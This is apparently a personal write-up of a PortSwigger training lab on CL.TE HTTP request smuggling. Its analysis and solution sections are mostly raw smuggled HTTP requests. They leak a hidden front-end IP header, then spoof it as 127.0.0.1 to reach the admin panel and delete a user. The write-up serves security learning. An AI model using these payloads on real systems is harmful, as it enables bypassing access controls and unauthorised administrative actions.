# [Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)

## Lab

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.

## Detect

- burpsuite active scan: detected http request smuggling after 5 minutes
- burpsuite `HTTP request smuggler` extension: detected CL.TE
- smuggler.py: `[tabprefix1]   : Potential CLTE Issue Found`

## Analysis

Path `/admin` is blocked:

  ```http
  GET /admin HTTP/1.1

  HTTP/1.1 401 Unauthorized

  Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1
  ```

try to smuggling:

- 1:

  ```http
  POST / HTTP/1.1^M$
  Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net^M$
  Content-Type: application/x-www-form-urlencoded^M$
  Content-Length: 95^M$
  tRANSFER-ENCODING: chunked^M$
  ^M$
  0^M$
  ^M$
  GET /admin HTTP/1.1^M$
  Host: localhost^M$
  Content-Length: 80^M$
  X-Forwarded-For: 127.0.0.1^M$
  ^M$
  x=
  ```

- 2:

  ```http
  GET / HTTP/1.1^M$
  Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net^M$
  ^M$

  HTTP/1.1 401 Unauthorized

  Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1
  ```

search function:

```http
POST / HTTP/1.1
Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net

search=hacked
abasdfe

HTTP/1.1 200 OK

<h1>0 search results for 'hacked
abasdfe
'</h1>
```

## Solutions

1. use smuggling with search function to find the hidden header added at frontend:

    ```http
    POST / HTTP/1.1^M$
    Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net^M$
    Content-Type: application/x-www-form-urlencoded^M$
    Content-Length: 101^M$
    tRANSFER-ENCODING: chunked^M$
    ^M$
    0^M$
    ^M$
    POST / HTTP/1.1^M$
    Content-Type: application/x-www-form-urlencoded0^M$
    Content-Length: 80^M$
    ^M$
    search=
    ```

    ```http
    GET / HTTP/1.1
    Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net

    HTTP/1.1 200 OK

    <h1>0 search results for 'GET / HTTP/1.1
    X-lrzVyq-Ip: 27.76.202.160
    Host: 0ad600ee044fe391c03da93'</h1>
    ```

    => hidden header `X-lrzVyq-Ip`

2. use this header to bypass localhost

    - first try:

      ```http
      GET /admin HTTP/1.1
      Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net
      X-lrzVyq-Ip: 127.0.0.1

      HTTP/1.1 400 Bad Request

      {"error":"Duplicate header names are not allowed"}
      ```

    - use smuggling, because the `X-lrzVyq-Ip` is only added to each request at frontend, therefore the smuggled request won't get error `Duplicate header names are not allowed`:

      ```http
      POST / HTTP/1.1^M$
      Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net^M$
      Content-Type: application/x-www-form-urlencoded^M$
      Content-Length: 147^M$
      tRANSFER-ENCODING: chunked^M$
      ^M$
      0^M$
      ^M$
      GET /admin/delete?username=carlos HTTP/1.1^M$
      X-lrzVyq-Ip: 127.0.0.1^M$
      Content-Type: application/x-www-form-urlencoded0^M$
      Content-Length: 80^M$
      ^M$
      x=
      ```

      ```http
      GET / HTTP/1.1
      Host: 0ad600ee044fe391c03da93100ff00ab.web-security-academy.net

      ```

solved
